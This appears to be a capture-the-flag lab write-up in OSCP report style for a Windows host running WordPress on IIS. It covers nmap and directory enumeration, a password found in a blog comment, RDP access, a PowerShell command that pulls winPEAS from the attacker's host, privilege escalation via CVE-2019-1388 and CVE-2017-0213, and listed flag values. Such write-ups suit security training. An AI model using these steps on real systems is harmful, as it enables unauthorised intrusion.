---
Status: "#Finished"
OS: windows
ip:
Start_Time: 2026-01-29 16:53
---

##  2. Information Gathering & Enumeration

### 2.1 Service Scanning
	The assessment began with an initial full-port TCP scan on the target host 10.81.133.128 to identify the attack surface. This phase successfully revealed two open ports: 80 (HTTP) and 3389 (RDP).
	Following port discovery, a detailed service version detection and default script scan(-sC,-sV)was performed. The results shows that target is running Microsoft IIS 10.0 on port 80. And the script enumerate that the netbios name of the target is RETROWEB.
```bash
# Nmap Full Scan
nmap -p- --min-rate 1000 -oN nmap_full.txt <IP>
# Nmap Detail scan
nmap -Pn -sV -sC -p <PORTS> <IP> -oN nmap_detailed
```
![](<assets/Pasted image 20260129202331.png>)
---
![](<assets/Pasted image 20260129202733.png>)
### 2.2 Directory enumerate
	After the initial detection, we start the directory enumeration on target. A fully quick enumerate is performed with gobuster and medium wordlists. The result shows that target has a directory(/retro). We visit the target directory and finds our that this is a blog authored by Wade, there are many hyperlink and all points toward a game website(arcade-museum.com), This may contain potential valuable information.
	Then I use dirsearch to do a deeper enumeration for /retro, which reflects several possible attack surface(login page). And the result of dirsearch shows that the blog is using wordpress(WP). 
```
#Directory enumerate
gobuster dir -u http://ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html
#Deeper Directory enumeration
dirsearch -u url
```
![](<assets/Pasted image 20260129203747.png>)
![](<assets/Pasted image 20260129203835.png>)
![](<assets/Pasted image 20260129205312.png>)
### 2.3 Login page identifiaction
	Using the result from dirsearch, I visit the wp-login.php page and verify that the username is wade.
	
![](<assets/Pasted image 20260129210413.png>)
	Then I tried to use the forgot password function and it returns that the host may disable the mail() function.
	![](<assets/Pasted image 20260129210522.png>)
### 2.4 Other potential attack surface
	With the result of dirsearch, there are still some potential attack surface and I list them below.
	The first one is xmlrpc in wordpress.
	
![](<assets/Pasted image 20260129211654.png>)
	The second one is the akismet.
![](<assets/Pasted image 20260129212056.png>)
##  3. Initial access
### 3.1 Vulnerability Discovery
	On wade's personal information page, I find a sensitive message which may be his password. By clicking the comments, we have a source code that contains sensitive information.

	
![](<assets/Pasted image 20260129212456.png>)
![](<assets/Pasted image 20260129212529.png>)
![](<assets/Pasted image 20260129212622.png>)
```bash
# The sensitive information
parzival
```
	I verify this and successfully login to the dashboard.
	
![](<assets/Pasted image 20260129212733.png>)
	Next, I try to verify whether this credential can be used for remote login or not. The target has open port 3389 and rdp service is running on it, so I use xfreerdp3 to remote login and success. Here I find user.txt is on the desktop.
```
xfreerdp3 /v:ip /u:用户名 /p:密码 /dynamic-resolution +clipboard
```

	

![](<assets/Pasted image 20260130102551.png>)

![](<assets/Pasted image 20260130102603.png>)

##  4. Privilege Escalation

### 4.1 Local Enumeration
*Record findings from automated scripts and manual environment checks.*
- [ ] **Automated Tool:** Run [[PEASS-ng]] (winPEAS.exe / linpeas.sh).
- [x] **Kernel Version:** `systeminfo` (Windows) or `uname -a` (Linux).
- [ ] **Sensitive Files:** Check for `.txt`, `.pdf`, `.zip` in user folders or web roots.
- [ ] **Misconfigurations:** (e.g., SUID, Sudo -l, Unquoted Service Paths, Token Impersonation).
#### 4.1.1 Systeminfo
	I run systeminfo and check the target windows system information. First, it is x64 system. Second, it only has one hotfix, which means there may be potential history vulnerabilities.

![](<assets/Pasted image 20260130104059.png>)
#### 4.1.2 Automated Tool
	Next, I download the winPEASany.exe on kali and host a local server. Then in target's powershell I get the winpeas and run it to check for potential path.
```
powershell -c "Invoke-WebRequest -Uri 'http://ip/winPEASx64.exe' -OutFile 'C:\Users\Wade\Desktop\wp.exe'"
```
	However, we have a problem. .net framework version is lower than 4.7, so we need to use a older winPEAS script. This time we choose winPEAS.bat.However, I haven't find some direct vulnerabilities. But in systeminfo, I find that it may be vulnerable by CVE-2017-0213. 

![](<assets/Pasted image 20260130201044.png>)
#### 4.1.3 Browser bookmark
	In target chrome browser, I find a bookmark which is CVE-2019-1388. This is really a direct hint. Because I also find that there is a .exe program in recycle bin, which can trigger UAC
	
![](<assets/Pasted image 20260130201347.png>)
![](<assets/Pasted image 20260130201408.png>)

### 4.2 Escalation Path
- **Vulnerability identified:** (CVE-2019-1388 and CVE-2017-0213)


**Step-by-Step Reproduction:**
1. Upload exploit/script to the target: I use meterpreter sessions to help me upload the exploit file.

![](<assets/Pasted image 20260130202052.png>)
1. Execute the exploit:
```bash
# Final command to elevate to SYSTEM/root
exploit.exe
```

---


---

##  6. Proof of Possession (Flags)
> [!DANGER] CRITICAL FOR OSCP
> The screenshot MUST contain: `whoami`, `ipconfig / ifconfig`, and the `flag` content in ONE terminal window.

| Flag Type     | Flag Content                     | Screenshot (Link)                           |
| :------------ | :------------------------------- | :------------------------------------------ |
| **user.txt**  | 3b99fbdc6d430bfb51c72c651a261927 | ![](<assets/Pasted image 20260130102830.png>) |
| **proof.txt** | 7958b569565d7bd88d10c6f22d1c4063 | ![](<assets/Pasted image 20260130203203.png>) |

---


